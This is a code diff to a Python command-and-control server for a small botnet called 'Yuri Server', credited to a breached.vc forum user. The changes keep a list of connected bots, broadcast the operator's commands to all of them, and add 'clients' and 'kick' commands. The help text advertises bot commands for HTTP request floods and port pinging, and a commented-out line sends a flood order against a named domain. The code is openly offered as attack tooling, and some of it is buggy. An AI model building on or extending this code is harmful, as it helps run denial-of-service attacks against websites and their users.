@@ -46,7 +46,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 hostname = socket.gethostname()
 hostip = socket.gethostbyname(str(hostname))
-port = 27035
+port = 27033
 try:
     s.bind((hostip, port))
 except:
@@ -59,12 +59,16 @@ print("")
 class server:
     def __init__(self):
         self.stop_threads = False
+        self.clients = []
+        self.addr = []
     def start(self):
         print("TYPE 'help' TO START!")
         self.listen_thread = threading.Thread(target=self.listen)
         self.listen_thread.start()
         self.command_thread = threading.Thread(target=self.command)
         self.command_thread.start()
+        self.logs_thread = threading.Thread(target=self.logs)
+        self.logs_thread.start()
     def listen(self):
         
         #print(1)
@@ -73,13 +77,14 @@ class server:
         
         print("[LOGS]: READY")
         
-        while True:
+        
+        self.clients.append(c)
+        self.addr.append(addr)
+        if self.stop_threads:
+            print("DEBUG 1")
+            return 
             
-            if self.stop_threads:
-                print("DEBUG 1")
-                break
-            
-            print(f"\n[LOGS]: Connection from {addr}")
+        print(f"\n[LOGS]: Connection from {addr}")
             #current_dir_cont = os.listdir()
             #if str(f"{addr}.ydata") in current_dir_cont:
              #   number_id = random.randint(-5000000, 5000000)
@@ -94,16 +99,22 @@ class server:
             #time.sleep(2)
             #s.close()
             #s.send("flood http://minexware.cc/".encode())
-    async def logs(self):
-        resp = s.recv(20480).decode()
-        print(Fore.GREEN + resp)
-        with open("logs.txt", "r") as lgs:
-            data = lgs.read()
-            lgs.close()
-        with open("logs.txt", "r") as logs:
-            logs.write(data + f"{c}" + resp + "\n")
-            logs.close()
-            
+    def logs(self):
+        while True:
+            if self.stop_threads:
+                print("DEBUG 2")
+                break
+            try:
+                resp = s.recv(20480).decode()
+                print(Fore.GREEN + resp)
+                with open("logs.txt", "r") as lgs:
+                    data = lgs.read()
+                    lgs.close()
+                with open("logs.txt", "w") as logs:
+                    logs.write(data + f"{c}" + resp + "\n")
+                    logs.close()
+            except:
+                continue
     def command(self):
         while True:
             
@@ -111,6 +122,7 @@ class server:
                 print("DEBUG 2")
                 break
             comm = input("[YURI-SHELL]: ").lower()
+            #stripped = comm.strip(" ")
             if comm.strip(" ") == "":
                 print("[ERROR]: No command supplied, skipping")
             elif comm == "exit":
@@ -131,14 +143,30 @@ class server:
                 print("Yuri Server")
                 print("Release: 1.0.5")
                 print("Made by https://breached.vc/User-Minex")
+            elif comm == "clients":
+                print(f"[CONNECTIONS]: {self.addr}")
             elif comm == "health":
                 
                 print(f"\n[LISTENING-THREAD]: {self.listen_thread.is_alive()}")
                 print(f"[SHELL-THREAD]: {self.command_thread.is_alive()}\n")
+            elif comm == "kick":
+                who = input("client->")
+                try:
+                    self.addr.remove(who)
+                    cnum = -1
+                    
+                    
+                    
+                    
+                    print("[LOGS]: Kicked a client")
+                except Exception as e:
+                    print(f"[ERROR]: Malfunction {e}")
             elif comm == "help":
                 print("\n###SERVER COMMANDS###")
                 print("info ##prints info about this program")
                 print("health ##prints thread's health(running or not)")
+                print("clients ##shows currently connected clients")
+                print("kick ##kick a client")
                 print("\n\n###CLIENT COMMANDS###")
                 print("ping <ip> <port> <loops> ##pings a desired ip on a desired port, repeats for custom number of times")
                 print("flood <http://domain.com> <duration> ##basic request flood on http domains\n")
@@ -146,7 +174,8 @@ class server:
             else:
             
                 print("[LOGS]: Sending command to clients")
-                c.sendall(str(comm[1]).encode())
+                for client in self.clients:
+                    client.sendall(str(comm).encode())
                 print("[LOGS]: Sent command to clients")
            #     continue
                 #print("[ERROR]: Couldn't send command")
